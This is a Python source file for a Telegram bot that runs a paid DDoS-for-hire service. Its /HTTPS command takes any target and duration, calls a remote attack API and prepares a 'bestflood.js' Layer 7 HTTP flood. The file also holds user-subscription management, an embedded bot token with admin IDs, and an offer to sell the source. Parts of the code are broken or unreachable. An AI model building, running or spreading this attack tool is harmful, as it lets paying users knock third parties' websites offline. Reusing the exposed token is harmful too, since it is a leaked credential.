#code by ht
import time
import datetime
import requests
import threading
import subprocess
import json
import os
import psutil
from telegram.constants import ParseMode
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    MessageHandler, filters, ConversationHandler
)
import requests

TOKEN = '7672118906:AAENX15UVxxbOhpYU-KfnLi-aUBN1Zy6H04'  # your bot token here

debug = True

authorized_users = {}
admin_users = set()
attack_slots = 2
cooldown_dict = {}
attack_slots_lock = threading.Lock()
last_attack_time = None
successful_attacks = []
user_list = []

def read_authorized_users():
    authorized_users = {}
    try:
        with open('users.txt', 'r') as f:
            for line in f:
                if line.strip():
                    user_id, expiry_date_str, max_duration_str = line.strip().split(':')
                    expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
                    max_duration = int(max_duration_str)
                    authorized_users[int(user_id)] = {'expiry_date': expiry_date, 'max_duration': max_duration}
    except FileNotFoundError:
        pass
    return authorized_users

def write_authorized_users(authorized_users):
    with open('users.txt', 'w') as f:
        for user_id, info in authorized_users.items():
            expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
            max_duration_str = str(info['max_duration'])
            f.write(f"{user_id}:{expiry_date_str}:{max_duration_str}\n")

def is_user_authorized(user_id):
    global authorized_users
    if user_id not in authorized_users:
        return False
    info = authorized_users[user_id]
    if info['expiry_date'] < datetime.datetime.now():
        del authorized_users[user_id]
        write_authorized_users(authorized_users)
        return False
    return True

def add_admin_user(user_id):
    global admin_users
    admin_users.add(user_id)

def remove_admin_user(user_id):
    global admin_users
    admin_users.discard(user_id)

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    username = update.effective_user.username if update.effective_user.username else "User"
    help_text = f"""
Hi {username} :)
User command:
/methods - Show Attack Method.
/running - Show Running Attacks.
/info - Show bot information.

Admin commands:
/adduser - Add new user.
/removeuser - Remove user.
/updateuser - Update user information.
/userlist - Show all users information.
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def methods(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        f"🪓 Methods\n\n"
        f"🩸 Layer 7\n"
        f" ⤷  HTTPS\n"
        f"Usage : /[method] [target] [time]"
    )

async def handle_running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global successful_attacks
    chat_id = update.message.chat.id

    if len(successful_attacks) == 0:
        await update.message.reply_text('No successful attacks yet.')
    else:
        msg = ''
        for attack in successful_attacks:
            msg += f'Target: {attack["target"]}\nDuration: {attack["duration"]}\nMethod: x.x.x.x\nUser ID: {attack["user_id"]}\nDate: {attack["time"]}\n\n'
        await update.message.reply_text(msg)
        successful_attacks = []

async def ddos_https_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global authorized_users
    global admin_users
    global attack_slots
    global last_attack_time
    global successful_attacks

    user_id = update.message.from_user.id
    username = update.message.from_user.username
    chat_id = update.message.chat_id

    if user_id not in user_list:
        user_list.append(user_id)

    if last_attack_time is None:
        last_attack_time = {}

  
        return

    content = update.message.text.split()

    if len(content) < 3:
        await update.message.reply_text('Usage : /HTTPS [target] [time]')
        return

    host = content[1]
    try:
        duration = int(content[2])
    except ValueError:
        await update.message.reply_text('Duration must be a number.')
        return

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        await update.message.reply_text(f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /HTTPS.")
        return

    def run_attack():
        command = [
            "node", "bestflood.js", host, str(duration),
            "10", "10", "http.txt","flood"
        ]
        
        
        try:
            apireq = requests.get(f"1.1.1.1/api.php?host={host}&port=80&time={duration}&method=HTTPS&key=thai")
            if apireq.status_code == 200:
                print(f"API 1 SUCCESSFUL: {host} {duration}")
            else:
                print(f"API 1 REQUEST FAILED: {apireq.status_code}")
        except requests.RequestException as e:
            print(f"API 1 REQUEST ERROR: {e}")

        print(f"START HTTPS {username} {host} {duration} SAVE HISTORY.TXT")
        
    threading.Thread(target=run_attack).start()
    cooldown_dict[username] = {'attack': time.time()}
    await update.message.reply_text('Attack started. Please wait...')
    time.sleep(1)
    await update.message.reply_text(
        f"💣 <b>Attack sent by {username}!</b>\n\n"
        f"⤷ Target : {host}\n"
        f"⤷ Duration : {duration} seconds\n"
        f"⤷ Method : HTTPS\n"
        f"⤷ Plan : VIP\n"
        f"⤷ Api : 2\n"
        f"⤷ Check-host : https://check-host.net/check-http?host={host}",
        parse_mode=ParseMode.HTML
    )

    successful_attacks.append({
        'target': host,
        'duration': duration,
        'user_id': user_id,
        'time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })


async def running(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global successful_attacks

    if len(successful_attacks) == 0:
        await update.message.reply_text('No successful attacks yet.')
    else:
        msg = ''
        for attack in successful_attacks:
            msg += f'Target: {attack["target"]}\nDuration: {attack["duration"]}\nMethod: x.x.x.x\nUser ID: {attack["user_id"]}\nDate: {attack["time"]}\n\n'
        await update.message.reply_text(msg)
        successful_attacks = []

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Info Bot:\nOwner: @ThaiDuongBotDDoS\nVersion: 5\nIf you want to buy source. Contact @producerht')

async def addvip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global authorized_users
    global admin_users
    global attack_slots
    global last_attack_time
    global successful_attacks

    user_id = update.message.from_user.id
    username = update.message.from_user.username
    chat_id = update.message.chat_id

    if user_id not in admin_users:
        await update.message.reply_text('Only admin can using commands.')
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text('Using: /addvip [id] [expiry date] [max attack times]')
        return  # Ensure to return early if the format is incorrect

    target_user_id = int(args[0])
    expiry_date_str = args[1]
    max_duration = int(args[2])
    expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')

    authorized_users[target_user_id] = {'expiry_date': expiry_date, 'max_duration': max_duration}
    write_authorized_users(authorized_users)

    await update.message.reply_text(f'Added {target_user_id} to access list with expiry date {expiry_date_str} and maximum duration {max_duration} seconds.')

async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global authorized_users
    global admin_users
    global attack_slots
    global last_attack_time
    global successful_attacks

    args = context.args
    if len(args) != 1:
        await update.message.reply_text('Using: /removeuser [id]')
        return  # Ensure to return early if the format is incorrect

    user_id = int(args[0])

    if user_id in authorized_users:
        del authorized_users[user_id]
        write_authorized_users(authorized_users)
        await update.message.reply_text(f'Removed {user_id} from the access list.')
    else:
        await update.message.reply_text(f'User {user_id} not in the access list.')

async def updateuser(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global authorized_users
    global admin_users
    global attack_slots
    global last_attack_time
    global successful_attacks
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text('Using: /updateuser [id] [expiry date] [max attack times]')
        return  # Ensure to return early if the format is incorrect

    target_user_id = int(args[0])
    expiry_date_str = args[1]
    max_duration = int(args[2])
    expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')

    if target_user_id in authorized_users:
        authorized_users[target_user_id]['expiry_date'] = expiry_date
        authorized_users[target_user_id]['max_duration'] = max_duration
        write_authorized_users(authorized_users)
        await update.message.reply_text(f'Updated user {target_user_id} with expiry date {expiry_date_str} and maximum duration {max_duration} seconds.')
    else:
        await update.message.reply_text(f'User {target_user_id} is not in the access list.')

async def userlist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global authorized_users
    global admin_users
    global attack_slots
    global last_attack_time
    global successful_attacks

    userlist = ''
    for user_id, info in authorized_users.items():
        expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
        max_duration_str = str(info['max_duration'])
        userlist += f'User ID: {user_id}\nExpiry Date: {expiry_date_str}\nMax Duration: {max_duration_str}\n\n'
    await update.message.reply_text(userlist)

def check_expired_users():
    global authorized_users
    now = datetime.datetime.now()
    for user_id, user_info in list(authorized_users.items()):
        expiry_date = user_info['expiry_date']
        if expiry_date < now:
            del authorized_users[user_id]
            write_authorized_users(authorized_users)
    threading.Timer(86400, check_expired_users).start()

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    authorized_users = read_authorized_users()
    admin_users = set()
    add_admin_user(5970359497)
    add_admin_user(1908668826)
    app.add_handler(CommandHandler("start", help))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("methods", methods))
    app.add_handler(CommandHandler("running", running))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("addvip", addvip))
    app.add_handler(CommandHandler("removeuser", removeuser))
    app.add_handler(CommandHandler("updateuser", updateuser))
    app.add_handler(CommandHandler("userlist", userlist))
    app.add_handler(CommandHandler("HTTPS", ddos_https_command))

    app.run_polling()



    print('Bot running...')
    check_expired_users()

# con di me may duong 